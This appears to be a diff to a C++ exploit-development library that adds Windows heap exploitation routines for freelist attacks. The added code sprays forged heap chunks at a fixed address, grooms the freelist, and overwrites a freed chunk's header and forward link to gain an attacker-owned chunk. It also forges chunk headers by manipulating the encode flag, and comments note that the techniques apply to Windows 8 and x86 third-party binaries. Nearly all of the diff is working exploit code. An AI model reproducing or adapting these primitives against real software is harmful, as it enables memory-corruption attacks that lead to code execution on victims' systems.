@@ -101,6 +101,70 @@ public:
 		return true;
 	}
 
+	//backend - both this backed exploitation techniques can be used also on windows 8
+	__checkReturn bool FreelistFreeToOwnAttack(__in short n)
+	{
+		if (n < ARRAY_SIZE)
+			return false;
+
+		HEAP_ENTRY own_bchunk[0x3];
+		BuildOwnHeap(own_bchunk, _countof(own_bchunk));
+
+		printf("sizeof chunk : %i", sizeof(own_bchunk));
+		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(own_bchunk), &own_bchunk, SPRAY_ADDR))
+			return false;
+
+		//sure that freelist max chunk size >= our requested size!!
+		//and leaked_chunk can not be the last!
+		if (!PopulateFreeList(n - FREELIST0_DELTA - 1, 4))
+			return false;
+
+		void* leak_chunk;
+		CHECK_ALLOC_RETB(leak_chunk, n - 1 + FREELIST0_DELTA);
+
+		printf("\r\nleak_chunk addr %x :\r\n", (ULONG_PTR)leak_chunk);
+
+		//get chunk, from freelist, vulnerable to overlflow!!
+		void* big_chunk;
+		CHECK_ALLOC_RETB(big_chunk, n - 1);
+		Free(big_chunk);
+
+		//simulate overflow!!
+		GetChunk(big_chunk)->CompactHeader = 0; //avoid to allocate this chunk!
+		GetChunk(big_chunk)->Links.Flink = SPRAY_FLINK;
+
+		//ole! get universal chunk :)
+		Free(leak_chunk);
+
+		return true;
+	}
+
+	//usefull only on x86 third parties binaries! (disable on failure cookie == false)
+	__checkReturn bool FreelistSearchToOwnHeapAttack(__in short n)
+	{
+		if (n < ARRAY_SIZE)
+			return false;
+
+		HEAP_ENTRY own_bchunk[0x3];
+		BuildOwnHeap(own_bchunk, _countof(own_bchunk));
+
+		if (!HeapSpray(0x100000 / HEAP_MIN_PAGE_SIZE, sizeof(own_bchunk), &own_bchunk, SPRAY_ADDR))
+			return false;
+
+		if (!PopulateFreeList(n - FREELIST0_DELTA - 1, 3))	//sure that freelist max chunk size >= our requested size!!
+			return false;
+
+//get chunk, from freelist, vulnerable to overlflow!!
+		void* big_chunk;
+		CHECK_ALLOC_RETB(big_chunk, n - 1);
+		Free(big_chunk);
+
+		//simulate overflow!!
+		GetChunk(big_chunk)->CompactHeader = 0; //avoid to allocate this chunk!
+		GetChunk(big_chunk)->Links.Flink = SPRAY_FLINK;
+
+		return true;
+	}
 
 protected:
 	void EmptyLookAside(__in short n){};
@@ -111,13 +175,29 @@ protected:
 		if (0 == count)
 			return;
 
-		memset(heap_chunks, 0xFF, count * sizeof(HEAP_ENTRY));
+#ifdef RND_APPROACH//not necessary to know ENCODE_FLAG_MASK!!
+		memset(heap_chunks, 0xAA, count * sizeof(HEAP_ENTRY));
+		RtlZeroMemory(heap_chunks, count * sizeof(HEAP_ENTRY));
+#else
+		if (3 < count)
+			return;
+
+		heap_chunks[1].Code1 |= ENCODE_FLAG_MASK;
+		heap_chunks[1].Size = 0x8000;
+		heap_chunks[2].Code2 |= ENCODE_FLAG_MASK;
+		heap_chunks[2].Size = 0x0000;
+
+		for (size_t i = 0; i < count; i++)
+		{
+			heap_chunks[2].Code2 |= ENCODE_FLAG_MASK;
+			heap_chunks[2].Size = 0xAAAA;
+		}
+#endif
 
 		for (size_t i = 0; i < count; i++)
 		{
 			heap_chunks[i].Links.Flink = SPRAY_NEXT_FLINK(i + 1);
 			heap_chunks[i].Links.Blink = SPRAY_NEXT_FLINK(i - 1);
-			heap_chunks[i].Code1 &= (~ENCODE_FLAG_MASK);
 		}
 
 		if (0x1 != count)
